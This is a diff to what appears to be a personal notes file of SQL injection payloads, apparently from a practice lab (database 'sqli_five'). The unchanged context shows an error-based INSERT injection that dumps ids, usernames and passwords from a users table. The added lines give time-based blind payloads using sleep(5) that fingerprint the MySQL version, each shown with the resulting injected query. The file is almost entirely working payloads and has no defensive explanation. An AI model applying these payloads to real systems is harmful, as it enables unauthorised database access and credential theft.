@@ -93,3 +93,14 @@ Insert Error Based
 6. title',(SELECT GROUP_CONCAT(concat(id,':',username,':',password),'<br>') FROM sqli_five.users));--
 # insert into comments (date,title,comment) values ('1784557994','title',(SELECT GROUP_CONCAT(concat(id,':',username,':',password),'
 ') FROM sqli_five.users));--','')
+
+Insert Blind Based
+1. ',sleep(5),'');--
+# insert into comments (date,name,email,message) values ('1784561739','',sleep(5),'');--','gee','errt')
+
+2. ',( select sleep(5) where version() like '8%' ) ,'');--
+# insert into comments (date,name,email,message) values ('1784561739','',( select sleep(5) where version() like '8%' ) ,'');--','','')
+
+3.',( select sleep(5) where version() = '8.0.43-0ubuntu0.22.04.2' ),'');--
+# insert into comments (date,name,email,message) values ('1784562174','',( select sleep(5) where version() = '8.0.43-0ubuntu0.22.04.2' ),'');--','','')
+
